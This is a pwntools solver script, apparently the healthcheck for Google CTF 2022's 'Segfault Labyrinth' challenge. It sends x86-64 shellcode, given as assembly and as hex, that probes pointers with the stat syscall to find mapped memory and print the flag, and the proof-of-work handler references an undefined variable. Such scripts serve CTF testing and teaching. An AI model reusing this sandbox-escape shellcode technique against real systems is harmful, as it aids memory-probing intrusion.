#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Author: Carl Svensson

import pwnlib
import pwnlib.tubes
import pwnlib.asm
import pwnlib.replacements
from pwnlib.log import getLogger
log = getLogger(__name__)
import re

pwnlib.context.context(os='linux', arch='amd64')

def handle_pow(io):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = io.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

io = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
io.recvuntil(b'== proof-of-work: ')
if io.recvline().decode().strip().startswith('enabled'):
    handle_pow(io)
else:
    io.sendline()

io.recvline_contains(b'Welcome to the Segfault Labyrinth')

code = """
mov r8, rdi

// NUM_LAYERS
mov rbx, 10
layer_loop:
test rbx, rbx
jz print_flag
// LAYER_SIZE
mov rcx, 16
element_loop:
test rcx, rcx
jz element_loop_end

// sys_stat
mov rax, 4
mov rdi, qword ptr [r8]
lea rsi, [rip+0x200]
syscall
// EFAULT
cmp rax, -14
jne element_loop_end
add r8, 8

dec rcx
jmp element_loop

element_loop_end:
mov r8, qword ptr [r8]
dec rbx
jmp layer_loop

print_flag:
mov rax, 1
mov rsi, r8
mov rdi, 1
mov rdx, 128
syscall

// Keep program alive until output has been sent
loop:
jmp loop
"""

#payload = pwnlib.asm.asm(code.strip()) # Can't be bothered to install as on the healthcheck
payload = bytes.fromhex('4989f848c7c30a0000004885db743648c7c1100000004885c9742248c7c004000000498b38488d35000200000f054883f8f275094983c00848ffc9ebd94d8b0048ffcbebc548c7c0010000004c89c648c7c70100000048c7c2800000000f05ebfe')

io.send(pwnlib.util.packing.p64(len(payload)))
pwnlib.replacements.sleep(1)
io.send(payload)

output = io.recvline().strip(b'\0').strip()
flag = output.decode()
log.debug('Flag: %s', flag)

exit_code = 0 if re.match('^CTF{.+}$', flag) else 1
exit(exit_code)
